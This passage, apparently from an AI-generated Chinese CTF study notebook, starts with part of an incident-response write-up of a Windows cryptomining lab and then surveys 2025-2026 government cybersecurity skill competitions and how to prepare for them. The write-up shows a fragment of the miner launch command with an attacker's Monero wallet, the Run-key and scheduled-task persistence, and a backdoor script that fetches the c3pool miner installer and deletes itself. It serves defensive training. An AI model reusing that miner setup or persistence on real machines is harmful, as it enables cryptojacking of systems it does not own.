& $tempfile 4APXVhukGNiR5kqqVC7jwiVaa5jDxUgPohEtAyuRS1uyeL6K1LkkBy9SKx5W1M7gYyNneusud6A8hKjJCtVbeoFARuQTu4Y
```

Monero钱包地址：`4APXVhukGNiR5kqqVC7jwiVaa5jDxUgPohEtAyuRS1uyeL6K1LkkBy9SKx5W1M7gYyNneusud6A8hKjJCtVbeoFARuQTu4Y`（106字符标准Monero地址）

#### 第三阶段：后门脚本排查

**8. 后门脚本MD5**

注册表启动项发现可疑条目：
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :: systems = C:\Users\Administrator\AppData\systems.bat
```

同时发现计划任务 `systemTesst`（触发器: LogonTrigger）也指向此脚本。

```
File: C:\Users\Administrator\AppData\systems.bat
Size: 374 bytes
MD5: 8414900F4C896964497C2CF6552EC4B9
SHA256: 0D585F815FC9AED1C5C03D4CD1E98B54F6AC5F980DC1901D53DC8C470E986621
LastWriteTime: 2024-05-21 20:30:02
```

**systems.bat内容分析：**
1. 下载 c3pool 官方挖矿安装脚本 `setup_c3pool_miner.bat`
2. 以攻击者钱包地址作为参数执行
3. 执行后删除临时脚本（反取证）

#### 持久化机制总结

| 机制 | 位置 | 内容 |
|------|------|------|
| 注册表Run键 | `HKLM\...\Run\systems` | 指向 `C:\Users\Administrator\AppData\systems.bat` |
| 计划任务 | `systemTesst` (LogonTrigger) | 指向同一个 `systems.bat` |
| Defender禁用 | `DisableRealtimeMonitoring=True` | 防止挖矿程序被查杀 |
| 排除路径 | Defender ExclusionPath | 屏蔽特定路径扫描 |

### 关键知识点

1. **Windows挖矿应急响应排查路径**：
   - 安全日志 4625/4624 -> 锁定攻击者IP和入侵方式
   - TerminalServices日志 -> RDP会话历史
   - Defender威胁检测 `Get-MpThreatDetection` -> 确认挖矿程序
   - `MpCmdRun.exe -Restore -All` -> 恢复被隔离的恶意文件
   - 注册表Run键 + 计划任务 -> 持久化后门
   - 临时目录bat脚本 -> 完整挖矿配置信息

2. **c3pool挖矿工具链**：
   - `setup_c3pool_miner.bat` -> 官方一键安装脚本
   - `xmrig.zip` -> 定制版XMRig（被Defender标记为Trojan:Win64/XmRig.CL!MTB）
   - `auto.c3pool.org` -> 矿池stratum地址（按算力自动选端口）
   - Monero钱包地址特征：以4开头，106字符

3. **WinRM远程排查技术**：
   - pypsrp库连接Windows靶机（端口5985，NTLM认证）
   - `-EncodedCommand` (UTF-16LE Base64) 避免引号转义问题
   - `chcp 65001` + `[Console]::OutputEncoding` 解决中文编码
   - `_strip_clixml()` 正则过滤WinRM CLIXML噪音

4. **Defender隔离区取证**：
   - 隔离区路径：`C:\ProgramData\Microsoft\Windows Defender\Quarantine\`
   - `MpCmdRun.exe -Restore -All` 恢复被隔离文件
   - `Get-MpThreatDetection` 查看威胁检测历史
   - 恢复后用 `Get-FileHash` 计算原始文件MD5

### 桌面解题工具

靶机桌面上有 `解题系统.exe`（5,860,667 bytes, MD5: CD69273F7420F58766745EFCB3E44F69, LastWriteTime: 2024-05-21 22:24:11），为题目自带的自动化评分工具。

> AI生成
---

## 附录D：近期网信办网络安全职业技能竞赛情报 (2025-2026)

> 信息来源：各地网信办官网、赛事通知，截至2026年8月2日整理

### D.1 重点赛事一览

| 赛事名称 | 主办单位 | 时间 | 赛制 | 面向人群 |
|----------|----------|------|------|----------|
| 福建省第一届"闽盾杯"网络安全职业技能竞赛 | 省委网信办+省人社厅+省总工会+团省委 | 初赛2026.7.15 / 决赛2026.8月中下旬 | 理论20%+CTF实操80% | 从业人员(在职) |
| 2026年第九届浦东新区网络安全大赛 | 上海浦东网信部门 | 2026.7.26线下决赛 | 理论+CTF实战 | 网络安全管理员/信息安全管理员 |
| 2026年ISG网络安全技能竞赛"观安杯" | 上海市委网信办 | 2026.8-9月 | 线上+线下 | 银行/国资/证券等行业 |
| 2025年"海河工匠杯"天津市网络安全职业技能竞赛 | 天津市委网信办等7部门 | 2025.12决赛 | 理论+实操 | 高校和企事业单位,216支队伍 |
| 2025年邢台市网络安全技能竞赛 | 邢台市委网信办 | 2025.9 | 理论+CTF夺旗 | 党政机关/企事业单位 |

### D.2 赛事核心特征分析

**1. 赛制标准统一化**
- 所有赛事均依据**国家职业技能标准高级工(三级)**要求
- 竞赛工种统一为**网络与信息安全管理员**
- 理论知识(选择题)占20%，CTF实操占80%
- 省级赛事纳入地方职业技能竞赛体系(如莆田市"壶兰工匠")

**2. 题型覆盖范围**

| 类别 | 考核内容 | 在我笔记本中的覆盖情况 |
|------|----------|----------------------|
| Web安全 | SQL注入/XSS/文件上传/文件包含/命令执行/反序列化/SSTI/SSRF | 已覆盖(题1-3,7-9,17,20) |
| 逆向工程 | Java字节码/Python pyc/ELF/PE | 已覆盖(题10-13) |
| PWN | 栈溢出/堆溢出/Ret2Shellcode/Fastbin | 已覆盖(题4-5,21-22) |
| 密码学 | RSA/古典密码/仿射/多层编码 | 已覆盖(题6,14-16,19) |
| 应急响应(IR) | 流量分析/Redis未授权/Windows挖矿/Linux Web | 已覆盖(题18,23-27) |
| 杂项(Misc) | 编码解码/图片隐写/压缩包/流量分析 | **待补充** |
| 电子取证 | 内存取证/磁盘取证 | **待补充** |
| 理论知识 | 网络安全法/等保/密码学基础/应急流程 | **待补充** |

**3. 2025-2026年CTF赛事趋势**

- **跨模块融合题占比超60%**：如Web+密码学组合出题
- **实战化场景成主流**：云环境漏洞、API调用安全
- **反制技术升级**：多层反调试、代码混淆
- **IR/取证题比重增加**：浦东新区赛道覆盖"电子取证"，闽盾杯考核"应急处置能力"
- **信创国产化**：闽盾杯黑盾大学生赛道新增信创方向

### D.3 备考重点（针对网信办职工竞赛）

#### 理论知识备考（20%分值）

| 模块 | 主要内容 | 备考资源 |
|------|----------|----------|
| 网络安全基础 | 安全概念、等级保护、风险评估 | 《网络与信息安全管理员》国家职业技能标准三级 |
| 网络协议安全 | TCP/IP安全、HTTPS、VPN、防火墙 | i春秋理论题库 |
| 密码学基础 | 对称/非对称加密、哈希、数字签名、PKI | 本笔记本Crypto章节 |
| 操作系统安全 | Linux/Windows安全配置、权限管理、日志审计 | 本笔记本IR章节 |
| Web安全 | OWASP Top 10、SQL注入、XSS、CSRF | 本笔记本Web章节 |
| 恶意代码 | 病毒/木马/蠕虫特征、检测与防范 | 本笔记本题25/27挖矿分析 |
| 数据安全 | 数据备份、加密存储、数据泄露防护 | — |
| 法律法规 | 《网络安全法》《数据安全法》《个人信息保护法》 | 本笔记本附录B安全自查指引 |
| 应急响应 | 安全事件分类、应急流程、取证基础 | 本笔记本IR章节+自动扫描器 |

#### CTF实操重点方向（80%分值）

**优先级排序（按赛事出题频率）：**

1. **Web安全**（投入50%精力）- 签到题和中等题主力
   - SQL注入（联合/报错/盲注/绕过）
   - 文件上传（后缀绕过/内容绕过/图片马）
   - 反序列化（PHP魔术方法/POP链/Phar）
   - SSTI模板注入（Jinja2/Twig/沙箱逃逸）
   - SSRF（内网探测/协议利用/Redis未授权）

2. **Misc杂项**（投入25%精力）- 签到题常客
   - 编码解码（Base64/32/16/Hex/URL/Unicode/摩尔斯）
   - 图片隐写（文件头修复/LSB/EXIF/盲水印）
   - 压缩包（伪加密/暴力破解/嵌套/ZIP明文攻击）
   - 流量分析（HTTP/TCP流追踪/USB流量）- **我已覆盖**

3. **密码学**（投入15%精力）
   - 古典密码（凯撒/维吉尼亚/栅栏/培根）- **我已覆盖**
   - RSA（模数分解/小公钥指数/共模攻击）- **我已覆盖**
   - AES/DES（ECB/CBC/Padding Oracle）

4. **逆向工程**（投入10%精力）
   - 静态分析（IDA Pro/Ghidra）- **我已覆盖**
   - 动态调试（x64dbg/GDB）
   - 简单算法还原

5. **IR/取证**（赛事新趋势，比重增加）
   - Windows应急响应 - **已开发自动扫描器(Linux+Windows双平台)**
   - 流量包分析 - **已开发PCAP Arcanum工具**
   - 内存取证/磁盘取证 - **待补充**

### D.4 知识缺口与补全计划

| 缺口 | 优先级 | 补全方式 |
|------|--------|----------|
| Misc图片隐写 | 高 | 补充StegSolve/LSB/zsteg用法，添加练习题 |
| Misc压缩包技巧 | 高 | 补充伪加密/明文攻击脚本 |
| 内存取证(Volatility) | 中 | 添加Volatility基本用法和例题 |
| 理论选择题库 | 中 | 整理网络安全法/等保高频考点 |
| 信创安全 | 低 | 关注国产化平台安全特性 |
| 云安全/API安全 | 低 | 关注2026新趋势题 |

### D.5 刷题平台推荐

| 平台 | 网址 | 特点 | 适合阶段 |
|------|------|------|----------|
| 攻防世界 | adworld.xctf.org.cn | XCTF官方，历年真题，技能树 | 全阶段 |
| CTFHub | ctfhub.com | 技能树体系，配套视频+Writeup | 入门-进阶 |
| BUUCTF | buuoj.cn | 大量真题聚合，题海利器 | 进阶-实战 |
| CTFShow | ctf.show | 1500+原创题，阶梯Hint | 入门-进阶 |
| BugKu | ctf.bugku.com | 2000+题，社区活跃 | 入门 |
| NSSCTF | nssctf.cn | 国内赛题复现 | 进阶-实战 |
| CryptoHack | cryptohack.org | 密码学专项 | 进阶 |

### D.6 闽盾杯系列赛事生态

福建省"闽盾"品牌是最典型的网信办职工竞赛体系：

- **闽盾杯网络安全职业技能竞赛**（从业人员）：理论20%+CTF 80%
- **闽盾杯网络空间安全大赛**（大学生）：线上CTF初赛+线下攻防决赛，含信创方向
- **闽盾大讲堂**：政策法规解读（网络安全法/数据安全条例/境外访问指引）
- **闽盾应急演练培训**：实操+等保，颁发结业证书
- **闽盾青锋宣讲团**：青少年网络安全科普
- 官网：heidunbei.si.net.cn / 福建网信网 fjwx.gov.cn

> AI生成